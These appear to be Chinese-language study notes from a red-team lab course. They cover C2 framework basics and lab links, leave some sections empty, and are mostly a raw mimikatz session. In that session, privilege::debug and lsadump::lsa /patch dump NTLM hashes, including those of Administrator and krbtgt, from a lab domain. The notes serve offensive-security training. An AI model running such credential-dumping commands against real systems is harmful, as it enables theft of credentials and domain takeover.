# 命令与控制

1. 什么是c2？
> Command & Control, often abbreviated to C2 or C&C, is the means by which an adversary can perform actions within a compromised environment.

2. c2框架有哪些？
>  Cobalt Strike, SCYTHE, Covenant, PoshC2, Faction, Koadic, Mythic and the Metasploit Framework

3. lab地址
> https://dashboard.snaplabs.io/events/p

4. 请求延期lab页面
> https://www.zeropointsecurity.co.uk/contact

5. 购买lab时间页面
> https://www.zeropointsecurity.co.uk/red-team-ops/lab

6. 启动服务器
参考```Starting the Team Server```这章

7. Listener

8. Payloads

9. 与Beacon交互


7. 命令

- 使用ctrl +和ctrl -增大/减小当前窗口中的字体大小。
- 右键单击X选项卡上的扩展操作，例如重命名和分离到浮动窗口。
- 用于ctrl + k清除当前窗口



dev
```

```
PS C:\Shares\software> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 12 2021 23:10:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : DC-2
SysKey : fc72de46b110e6f12aa3d96db26932dc
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
Domain : DEV / S-1-5-21-3263068140-2042698922-2891547269

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : aa93e8df34aca6154cb2f5ab9f9e8338

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 833ef1dcc490f88a8f4a8a00859736de

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000458 (1112)
User : nlamb
LM   :
NTLM : 2e8a408a8aec852ef2e458b938b8c071

RID  : 00000460 (1120)
User : bfarmer
LM   :
NTLM : 4ea24377a53e67e78b2bd853974420fc

RID  : 00000461 (1121)
User : jadams
LM   :
NTLM : 126502da14a98b58f2c319b81b3a49cb

RID  : 00000462 (1122)
User : jking
LM   :
NTLM : 4ffd3eabdce2e158d923ddec72de979e

RID  : 00000467 (1127)
User : svc_oracle
LM   :
NTLM : fc525c9683e8fe067095ba2ddc971889

RID  : 0000046e (1134)
User : svc_mssql
LM   :
NTLM : ac548f25225b5e0974a79a59fc27fc2c

RID  : 00000471 (1137)
User : svc_honey
LM   :
NTLM : 5710c2241f5c0b6cc6e26a2b79e8a725

RID  : 00000472 (1138)
User : svc_squid
LM   :
NTLM : fc525c9683e8fe067095ba2ddc971889

RID  : 000003f0 (1008)
User : DC-2$
LM   :
NTLM : 23ed7bfb48cc9d92cf8c64cfc7c3b7a1

RID  : 00000459 (1113)
User : WKSTN-1$
LM   :
NTLM : 481fb07b7020985da2ce5b28b571ef98

RID  : 0000045a (1114)
User : WKSTN-2$
LM   :
NTLM : d89c7ae3e65447e859dff0daf875c921

RID  : 0000045b (1115)
User : SRV-1$
LM   :
NTLM : 7c3398f737cfef81682176be252d7fce

RID  : 0000045d (1117)
User : SRV-2$
LM   :
NTLM : f797a8372d1e7a821e49f61efca73e23

RID  : 00000469 (1129)
User : NIX-1$
LM   :
NTLM : 1026edefeb9dd6d939a825c908a79785

RID  : 00000457 (1111)
User : CYBER$
LM   :
NTLM : 256e02a6d4f03d791db0bb16e8a5a30a

RID  : 0000045c (1116)
User : SUBSIDIARY$
LM   :
NTLM : a415295cf2bfd3d70c0e9d881c21b074

mimikatz #

```
```